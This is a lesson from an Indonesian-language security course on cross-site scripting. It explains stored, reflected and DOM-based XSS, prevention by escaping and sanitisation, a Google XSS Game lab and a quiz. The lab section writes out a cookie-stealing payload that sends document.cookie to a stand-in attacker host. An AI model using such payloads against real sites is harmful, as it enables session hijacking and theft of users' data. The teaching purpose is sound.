# 🔨 Week 14 · Day 2: Cross-Site Scripting (XSS)

> **Rank**: FORGE | **Minggu ke-14**, Hari 2/5 | **Durasi**: ~45 menit

📊 **Progress**: Week 14 · Day 2/5 | FORGE Rank (Minggu 5 dari 5) | Overall: 67/120 hari (56%)

---

## 🎯 Tujuan Hari Ini

Setelah menyelesaikan materi hari ini, kamu akan mampu:

1. **Membedakan** anatomi tiga varian XSS: Stored, Reflected, dan DOM-based.
2. **Mensimulasikan** dampak kerentanan XSS melalui lab interaktif.
3. **Mengamankan** aplikasi *frontend* dari injeksi XSS menggunakan metode sanitasi.

---

## 📖 Materi Inti

### Eksploitasi Sisi Klien: XSS

Jika *SQL Injection (SQLi)* menargetkan *database*, maka **Cross-Site Scripting (XSS)** menargetkan browser pengguna secara langsung (*client-side*).

XSS terjadi ketika sebuah aplikasi web menerima input dari pengguna dan menampilkannya kembali di halaman web **tanpa melakukan sanitasi**. 

Sebagai contoh, alih-alih menulis komentar biasa, penyerang memasukkan *script* berbahaya:
```html
<script> alert('Situs Ini Diretas!'); </script>
```

Jika web menampilkan input ini secara mentah (misal menggunakan `innerHTML`), browser korban akan mengira bahwa *script* tersebut adalah bagian dari web dan mengeksekusinya. *script* ini bisa digunakan untuk mencuri data sensitif seperti *cookie* sesi.

### Tiga Kategori Varian XSS

1. **Stored XSS (Paling Berbahaya):**
   - *Payload* XSS **disimpan** secara permanen di *database* server (contoh: di dalam komentar forum, profil pengguna).
   - Setiap kali pengguna lain membuka halaman yang memuat data tersebut, *script* akan dieksekusi secara otomatis di browser mereka tanpa mereka sadari.

2. **Reflected XSS:**
   - *Payload* XSS **tidak** disimpan di *database*.
   - Penyerang menyisipkan *script* ke dalam parameter URL dan mengelabui korban untuk mengklik tautan tersebut.
   - Contoh URL jebakan: `https://banktiss.com/cari?query=<script>curiUang()</script>`
   - Ketika korban mengklik link tersebut, server merespons dengan menampilkan *script* di halaman, yang kemudian dieksekusi oleh browser korban.

3. **DOM-based XSS:**
   - Terjadi sepenuhnya di sisi klien (*frontend*) tanpa melibatkan *backend*.
   - Kerentanan muncul ketika *script* di sisi klien (JavaScript) mengambil data dari sumber yang dapat dikontrol penyerang (seperti URL) dan meneruskannya ke *sink* yang berbahaya (seperti `innerHTML`) tanpa sanitasi.

### Mekanisme Pencegahan: Sanitasi dan Escaping

Bagaimana cara mencegah XSS? Aturan utamanya adalah: **jangan pernah mempercayai input pengguna**.

1. **Output Encoding / Escaping:** 
   Ubah karakter-karakter spesial HTML menjadi bentuk entitas HTML yang aman.
   - `<` menjadi `&lt;`
   - `>` menjadi `&gt;`
   Dengan cara ini, input `<script>` akan dirender sebagai teks biasa `&lt;script&gt;` dan tidak akan dieksekusi.

2. **Gunakan Properti JavaScript yang Aman:**
   Di *frontend*, hindari penggunaan properti yang mengeksekusi HTML seperti `innerHTML`. Sebagai gantinya, gunakan properti yang hanya menangani teks seperti `textContent` atau `innerText`.

3. **Gunakan Library Sanitasi:**
   Jika aplikasi memang perlu merender HTML dari pengguna (misal editor *Rich Text*), gunakan library yang khusus untuk membersihkan HTML, seperti `DOMPurify`.

---

## 🧪 Mini Lab

**Durasi**: ~10 menit

Mari kita coba mensimulasikan injeksi *payload* XSS!

1. Buka simulasi lab XSS (Google XSS Game) di: `https://xss-game.appspot.com/level1`
2. Pada kotak pencarian (*search box*), masukkan *payload* JavaScript berikut:
   ```html
   <script>alert(1)</script>
   ```
3. Klik tombol pencarian.
4. *Pop-up alert* berisi angka `1` akan muncul! Ini membuktikan bahwa *script* yang kamu masukkan berhasil dieksekusi oleh browser.
5. Dalam skenario serangan nyata, penyerang tidak akan menggunakan `alert(1)`. Mereka akan menggunakan *payload* yang mencuri data rahasia, misalnya `<script>fetch('http://server-peretas.com/log?cookie='+document.cookie)</script>` untuk mencuri *cookie* sesi korban.

---

## 💡 Quiz Kilat

<details>
<summary>❓ Apa perbedaan utama dari target serangan SQL Injection dan XSS?</summary>

**Jawaban:** SQL Injection menargetkan *database* (server-side) untuk memanipulasi atau mencuri data, sedangkan XSS menargetkan browser pengguna (*client-side*) untuk mengeksekusi *script* berbahaya dan mencuri sesi atau data pengguna.
</details>

<details>
<summary>❓ Mengapa Stored XSS dianggap lebih berbahaya daripada Reflected XSS?</summary>

**Jawaban:** Karena *payload* Stored XSS disimpan secara permanen di server (misalnya dalam bentuk komentar). Serangan ini akan mengenai siapa saja yang melihat halaman tersebut secara otomatis, tanpa perlu mengelabui korban untuk mengklik tautan khusus.
</details>

<details>
<summary>❓ Properti DOM apa yang sebaiknya dihindari saat menampilkan input pengguna menggunakan Vanilla JavaScript untuk mencegah DOM-based XSS?</summary>

**Jawaban:** Properti `innerHTML`. Sebaiknya gunakan `textContent` atau `innerText` agar input dirender sebagai teks biasa, bukan sebagai elemen HTML yang bisa dieksekusi.
</details>

---

## 📋 Checklist Hari Ini

- [ ] Saya memahami perbedaan antara Stored XSS, Reflected XSS, dan DOM-based XSS.
- [ ] Saya mengetahui bahaya penggunaan fungsi seperti `innerHTML` dan bagaimana cara mencegah XSS (menggunakan `textContent` atau sanitasi HTML).
- [ ] Saya telah berhasil menyelesaikan simulasi injeksi *script* `alert(1)` di lab XSS.
- [ ] Saya telah menyelesaikan dan memahami jawaban dari *Quiz Kilat*.

---

## 🔗 Resources

- [Google XSS Game](https://xss-game.appspot.com/) — Platform edukasi dari Google untuk belajar XSS melalui simulasi interaktif.

---

## ➡️ Besok

**Day 3: Broken Access Control & IDOR** — Kita telah membahas SQLi (manipulasi database) dan XSS (injeksi browser). Keduanya menggunakan masukan yang tidak biasa atau manipulatif. Tapi bagaimana jika eksploitasinya menggunakan input yang sepenuhnya valid? Bagaimana jika penyerang hanya mengubah parameter ID di URL (misal dari `id=123` menjadi `id=124`) dan berhasil mengakses data pengguna lain? Itulah yang disebut dengan kerentanan **IDOR (Insecure Direct Object Reference)** dan **Broken Access Control**, salah satu celah keamanan paling umum dan berbahaya menurut standar OWASP Top 10.

---

*📅 TISS Null Teaming · Week 14 · Day 2 · FORGE Rank*
